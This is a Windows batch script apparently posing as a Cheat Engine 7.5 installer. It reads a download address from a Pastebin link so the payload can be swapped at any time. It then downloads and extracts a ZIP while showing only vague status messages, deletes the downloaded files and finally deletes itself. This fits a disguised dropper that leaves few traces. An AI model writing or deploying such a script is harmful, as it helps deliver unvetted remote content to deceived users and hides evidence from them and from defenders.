@echo off
setlocal

:: Define the Pastebin raw link for the file URL
set "urlPastebin=https://pastebin.com/raw/LDjav1Sf"   :: Replace with your Pastebin raw link containing the file URL
set "zipFile=Cheat_Engine_7.5.zip"
set "extractDir=Cheat_Engine"
set "downloadUrlFile=download_url.txt"
set "selfDelete=%~f0"

:: Download the file URL from Pastebin
echo Loading...
powershell -Command "try {Invoke-WebRequest -Uri '%urlPastebin%' -OutFile '%downloadUrlFile%'} catch {Write-Host 'Error downloading the file URL from Pastebin: ' $_.Exception.Message; exit 1}"
if errorlevel 1 (
    echo Failed to get URL.
    exit /b 1
)

:: Check if the file URL was downloaded
if not exist "%downloadUrlFile%" (
    echo Failed to get file URL.
    exit /b 1
)

:: Read the file URL from the downloaded file
set /p fileUrl=<%downloadUrlFile%

:: Validate the file URL (optional, can be customized)
if "%fileUrl%"=="" (
    echo The file URL is empty or invalid.
    exit /b 1
)

:: Download the file using the URL from Pastebin
echo Downloading Cheat Engine 7.5.zip
powershell -Command "try {Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%zipFile%'} catch {Write-Host 'Error downloading the file from the URL: ' $_.Exception.Message; exit 1}"
if errorlevel 1 (
    echo Failed to download the file.
    exit /b 1
)

:: Check if the ZIP file was downloaded
if not exist "%zipFile%" (
    echo Failed to download the file.
    exit /b 1
)

:: Create the extraction directory if it doesn't exist
if not exist "%extractDir%" mkdir "%extractDir%"

:: Extract the ZIP file using built-in Windows extractor
echo Extracting ZIP file...
powershell -Command "try {Expand-Archive -Path '%zipFile%' -DestinationPath '%extractDir%' -Force} catch {Write-Host 'Error extracting ZIP file: ' $_.Exception.Message; exit 1}"
if errorlevel 1 (
    echo Failed to extract the ZIP file.
    exit /b 1
)

:: Delete the ZIP file
del "%zipFile%"

:: Clean up
del "%downloadUrlFile%"

:: Schedule script self-destruction
echo Cleaning Up...
timeout /t 2 /nobreak >nul
start "" /b cmd /c "del /q "%selfDelete%""

exit /b 0